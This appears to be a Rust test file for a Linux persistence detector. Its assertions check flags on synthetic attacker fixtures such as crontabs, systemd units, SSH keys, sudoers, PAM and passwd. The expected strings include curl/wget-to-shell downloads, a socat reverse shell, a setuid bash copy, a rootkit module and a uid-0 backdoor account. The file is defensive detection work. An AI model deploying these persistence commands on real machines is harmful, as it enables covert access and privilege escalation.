//! Files written as an attacker might leave them (`tests/fixtures/synthetic/`):
//! what runs, as whom and when, and what's flagged. Fingerprints are the
//! ones `ssh-keygen -lf` prints for the same files.

use std::fs;
use std::path::Path;

use persistence::{detect, flags, parse, Detail, Flag, Kind, Parsed};

fn read(path: &str) -> Parsed {
    let data = fs::read(
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("tests/fixtures/synthetic")
            .join(path),
    )
    .unwrap();
    // As a collection stores it.
    let stored = format!("uac/[root]/{path}");
    let parsed = parse(detect(&stored).unwrap(), &data, &stored);
    assert!(parsed.problems.is_empty(), "{path}: {:?}", parsed.problems);
    parsed
}

/// Each entry's line, and its flags when it has some.
fn flagged(parsed: &Parsed) -> Vec<(usize, Vec<Flag>)> {
    parsed
        .entries
        .iter()
        .map(|entry| (entry.line, flags(entry)))
        .filter(|(_, flags)| !flags.is_empty())
        .collect()
}

#[test]
fn crontabs() {
    let system = read("etc/crontab");
    assert_eq!(
        flagged(&system),
        [
            (7, vec![Flag::TemporaryDirectory, Flag::AtReboot]),
            (8, vec![Flag::DownloadToShell]),
        ]
    );
    let job = &system.entries[5];
    assert_eq!(job.schedule.as_deref(), Some("*/10 * * * *"));
    assert_eq!(job.user.as_deref(), Some("root"));
    assert_eq!(
        job.summary(),
        "*/10 * * * * as root: curl -fsSL http://203.0.113.50/u.sh | bash"
    );
    assert_eq!(system.entries[6].user.as_deref(), Some("www-data"));

    let dropped = read("etc/cron.d/sysupdate");
    assert_eq!(flagged(&dropped), [(2, vec![Flag::Base64Decoding])]);

    // Users' crontabs run as the account they're named after.
    let alice = read("var/spool/cron/crontabs/alice");
    assert_eq!(alice.entries.len(), 3);
    assert!(alice
        .entries
        .iter()
        .skip(1)
        .all(|e| e.user.as_deref() == Some("alice")));
    assert_eq!(
        flagged(&alice),
        [(6, vec![Flag::TemporaryDirectory, Flag::AtReboot])]
    );
    let anacron = read("etc/anacrontab");
    let refresh = &anacron.entries[5];
    assert_eq!(refresh.schedule.as_deref(), Some("1"));
    assert_eq!(
        refresh.detail,
        Detail::AnacronJob {
            delay_minutes: 1,
            id: "sys.refresh".to_owned()
        }
    );
    assert_eq!(flagged(&anacron), [(8, vec![Flag::DownloadToShell])]);

    let rhel = read("var/spool/cron/root");
    assert_eq!(rhel.entries[0].kind, Kind::Crontab);
    assert_eq!(rhel.entries[0].user.as_deref(), Some("root"));
    assert_eq!(flagged(&rhel), [(2, vec![Flag::ReverseShell])]);
}

#[test]
fn systemd_units() {
    let service = read("etc/systemd/system/sysupdate.service");
    let start = service.entries.iter().find(|e| e.line == 12).unwrap();
    // Three lines joined, `;` comment skipped.
    assert_eq!(
        start.command.as_deref(),
        Some("/usr/bin/socat            TCP:198.51.100.23:8443            EXEC:/bin/bash")
    );
    assert_eq!(start.user.as_deref(), Some("root"));
    assert_eq!(
        flagged(&service),
        [
            (11, vec![Flag::TemporaryDirectory]),
            (12, vec![Flag::ReverseShell]),
        ]
    );
    let Detail::UnitSetting { exec_prefixes, .. } = &service.entries[5].detail else {
        panic!()
    };
    assert_eq!(exec_prefixes, "-");

    let timer = read("etc/systemd/system/sysupdate.timer");
    let schedules: Vec<_> = timer
        .entries
        .iter()
        .filter_map(|e| e.schedule.as_deref())
        .collect();
    assert_eq!(schedules, ["2min", "*-*-* *:00/15:00"]);

    for unit in ["sysupdate.path", "sysupdate.socket", "sysupdate@.service"] {
        assert!(!read(&format!("etc/systemd/system/{unit}"))
            .entries
            .is_empty());
    }

    // A drop-in adding a privileged command to a trusted unit.
    let drop_in = read("etc/systemd/system/ssh.service.d/override.conf");
    let added = &drop_in.entries[0];
    assert_eq!(
        added.summary(),
        "ExecStartPost: /bin/sh -c 'cp /bin/bash /var/tmp/.b; chmod 4755 /var/tmp/.b'"
    );
    let Detail::UnitSetting { exec_prefixes, .. } = &added.detail else {
        panic!()
    };
    assert_eq!(exec_prefixes, "+");

    let user_unit = read("home/alice/.config/systemd/user/agent.service");
    assert_eq!(user_unit.entries[1].user.as_deref(), Some("alice"));
}

#[test]
fn authorized_keys_and_fingerprints() {
    let alice = read("home/alice/.ssh/authorized_keys");
    let keys: Vec<_> = alice
        .entries
        .iter()
        .map(|entry| {
            let Detail::AuthorizedKey(key) = &entry.detail else {
                panic!()
            };
            (
                entry.user.as_deref(),
                key.key_type.as_str(),
                key.fingerprint.as_deref(),
                key.comment.as_deref(),
            )
        })
        .collect();
    assert_eq!(
        keys,
        [
            (
                Some("alice"),
                "ssh-ed25519",
                Some("SHA256:SqE5zvu2blyg8olJGmdQZkk4fTVvZTB+/dsD4kQwQO0"),
                Some("test-ed25519@example.net")
            ),
            (
                Some("alice"),
                "ssh-rsa",
                Some("SHA256:zXwl/4Y1Q+RGkkgKAU/wzUSoLTwtjdCqClNXXuechI4"),
                Some("test-rsa@example.net")
            ),
        ]
    );
    let backup = &alice.entries[1];
    let Detail::AuthorizedKey(key) = &backup.detail else {
        panic!()
    };
    let names: Vec<_> = key.options.iter().map(|o| o.name.as_str()).collect();
    assert_eq!(names, ["from", "command", "no-pty", "no-port-forwarding"]);
    assert_eq!(key.options[0].value.as_deref(), Some("198.51.100.0/24"));
    assert_eq!(flagged(&alice), [(4, vec![Flag::ForcedCommand])]);

    let root = read("root/.ssh/authorized_keys2");
    let entry = &root.entries[0];
    assert_eq!(entry.user.as_deref(), Some("root"));
    assert_eq!(
        entry.command.as_deref(),
        Some("/bin/bash -c \"curl -s http://203.0.113.9/k | sh\"; exec $SHELL")
    );
    let Detail::AuthorizedKey(key) = &entry.detail else {
        panic!()
    };
    assert_eq!(
        key.fingerprint.as_deref(),
        Some("SHA256:1Xen2jCzzLu1B0A+pWGeDQImXZPXkCxblDviKfpxgvU")
    );
    assert_eq!(
        flagged(&root),
        [(1, vec![Flag::DownloadToShell, Flag::ForcedCommand])]
    );
}

#[test]
fn boot_and_login_scripts() {
    let rc = read("etc/rc.local");
    assert_eq!(rc.entries.len(), 2);
    assert_eq!(rc.entries[0].line, 5);
    assert_eq!(rc.entries[0].user.as_deref(), Some("root"));
    assert_eq!(
        rc.entries[0].command.as_deref(),
        Some("/usr/bin/wget -q -O /tmp/.x http://192.0.2.77/x && chmod +x /tmp/.x &&   /tmp/.x &")
    );
    assert_eq!(flagged(&rc), [(5, vec![Flag::TemporaryDirectory])]);

    // ESXi's boot script: a backdoor started, and a listening shell.
    let esxi = read("etc/rc.local.d/local.sh");
    assert_eq!(esxi.entries.len(), 3);
    assert!(esxi
        .entries
        .iter()
        .all(|e| e.user.as_deref() == Some("root")));
    assert_eq!(flagged(&esxi), [(6, vec![Flag::ReverseShell])]);

    let profile = read("etc/profile.d/update.sh");
    assert_eq!(flagged(&profile), [(3, vec![Flag::TemporaryDirectory])]);
    assert_eq!(profile.entries[1].user, None);

    let bashrc = read("home/alice/.bashrc");
    assert!(bashrc
        .entries
        .iter()
        .all(|e| e.user.as_deref() == Some("alice")));
    assert_eq!(flagged(&bashrc), [(5, vec![Flag::TemporaryDirectory])]);
}

#[test]
fn preload() {
    let parsed = read("etc/ld.so.preload");
    assert_eq!(parsed.entries.len(), 1);
    assert_eq!(
        parsed.entries[0].command.as_deref(),
        Some("/usr/local/lib/libprocesshider.so")
    );
    assert_eq!(flagged(&parsed), [(1, vec![Flag::Preload])]);
}

#[test]
fn sudoers() {
    let parsed = read("etc/sudoers.d/90-backdoor");
    let summaries: Vec<_> = parsed
        .entries
        .iter()
        .map(persistence::Entry::summary)
        .collect();
    assert_eq!(
        summaries,
        [
            "User_Alias OPERATORS = alice, %ops",
            "Cmnd_Alias SHELLS = /bin/sh, /bin/bash, /usr/bin/zsh",
            "Defaults:OPERATORS !authenticate",
            "OPERATORS may run SHELLS as ALL",
            "svc-backup may run ALL as ALL:ALL (NOPASSWD)",
            "bob may run /usr/bin/systemctl restart nginx, /usr/bin/journalctl as root on web1, web2 (NOPASSWD)",
            "includes every file in /etc/sudoers.local.d",
        ]
    );
    assert_eq!(
        flagged(&parsed),
        [
            (5, vec![Flag::SudoWithoutPassword]),
            (7, vec![Flag::SudoWithoutPassword]),
        ]
    );
}

#[test]
fn at_jobs() {
    let parsed = read("var/spool/cron/atjobs/a0000201c79c28");
    let job = &parsed.entries[0];
    assert_eq!(
        job.summary(),
        "at 2026-10-09T07:36Z as alice: wget -qO- http://203.0.113.40/u | sh"
    );
    assert_eq!(
        job.detail,
        Detail::AtJob {
            queue: Some('a'),
            job: Some(2),
            uid: Some(1001)
        }
    );
    assert_eq!(flagged(&parsed), [(11, vec![Flag::DownloadToShell])]);
}

#[test]
fn init_scripts() {
    let parsed = read("etc/init.d/sysupdate");
    assert!(parsed
        .entries
        .iter()
        .all(|e| e.user.as_deref() == Some("root")));
    assert_eq!(flagged(&parsed), [(12, vec![Flag::TemporaryDirectory])]);
}

#[test]
fn pam() {
    let parsed = read("etc/pam.d/sshd");
    assert_eq!(
        parsed.entries[0].summary(),
        "sshd: auth sufficient pam_permit.so"
    );
    assert_eq!(parsed.entries[1].summary(), "includes common-auth");
    assert_eq!(
        parsed.entries[5].command.as_deref(),
        Some("/usr/local/sbin/.pam-log")
    );
    assert_eq!(
        flagged(&parsed),
        [
            (3, vec![Flag::PamAcceptsAnyPassword]),
            (5, vec![Flag::PamModuleElsewhere]),
            (8, vec![Flag::PamExec]),
        ]
    );
}

#[test]
fn sshd_config() {
    let parsed = read("etc/ssh/sshd_config.d/99-tuning.conf");
    assert_eq!(
        parsed.entries[3].summary(),
        "ForceCommand /usr/local/bin/rrsync -ro /srv (Match User backup)"
    );
    assert_eq!(
        flagged(&parsed),
        [
            (2, vec![Flag::RootPasswordLogin]),
            (3, vec![Flag::EmptyPasswords]),
            (4, vec![Flag::KeysElsewhere]),
        ]
    );
}

#[test]
fn udev_autostart_and_kernel_modules() {
    let udev = read("etc/udev/rules.d/99-usb-sync.rules");
    assert_eq!(
        udev.entries[0].summary(),
        "on ACTION==\"add\", SUBSYSTEM==\"block\", ENV{ID_BUS}==\"usb\": runs /bin/sh -c 'curl -s http://198.51.100.23/s | sh'"
    );
    assert_eq!(flagged(&udev), [(2, vec![Flag::DownloadToShell])]);
    assert_eq!(udev.entries[1].command, None);

    let autostart = read("home/alice/.config/autostart/tracker-extract.desktop");
    assert_eq!(
        autostart.entries[0].summary(),
        "at login as alice: Tracker Extract: /home/alice/.cache/.tracker/tracker-extract --daemon"
    );

    let modprobe = read("etc/modprobe.d/blacklist-local.conf");
    assert_eq!(flagged(&modprobe), [(4, vec![Flag::ModprobeCommand])]);
    let modules = read("etc/modules-load.d/kernel-helpers.conf");
    assert_eq!(
        modules.entries[0].summary(),
        "kernel module loaded at boot: diamorphine"
    );
}

#[test]
fn accounts() {
    let passwd = read("etc/passwd");
    assert_eq!(passwd.entries.len(), 6);
    assert_eq!(
        flagged(&passwd),
        [
            (3, vec![Flag::SystemAccountShell]),
            (5, vec![Flag::UidZero]),
            (6, vec![Flag::NoPasswordNeeded])
        ]
    );
    assert_eq!(
        passwd.entries[4].summary(),
        "toor (uid 0): /bin/bash, home /root"
    );

    let shadow = read("etc/shadow");
    let summaries: Vec<String> = shadow
        .entries
        .iter()
        .map(persistence::Entry::summary)
        .collect();
    assert_eq!(
        summaries,
        [
            "root: password yescrypt, changed 2024-10-04",
            "daemon: password no password, changed 2024-10-04",
            "www-data: password no password, changed 2024-10-04",
            "alice: password locked, changed 2025-01-12",
            "toor: password sha512crypt, changed 2026-10-04",
            "svc-backup: password empty, changed 2026-10-04",
        ]
    );
    assert_eq!(flagged(&shadow), [(6, vec![Flag::NoPasswordNeeded])]);
    let Detail::Password(password) = &shadow.entries[5].detail else {
        panic!("not a password");
    };
    assert_eq!(password.expires.as_deref(), Some("2026-12-13"));
    // The hash is never kept.
    assert!(!format!("{shadow:?}").contains("aGFzaA"));

    let group = read("etc/group");
    assert_eq!(group.entries.len(), 1);
    assert_eq!(group.entries[0].summary(), "group sudo: alice, svc-backup");
}
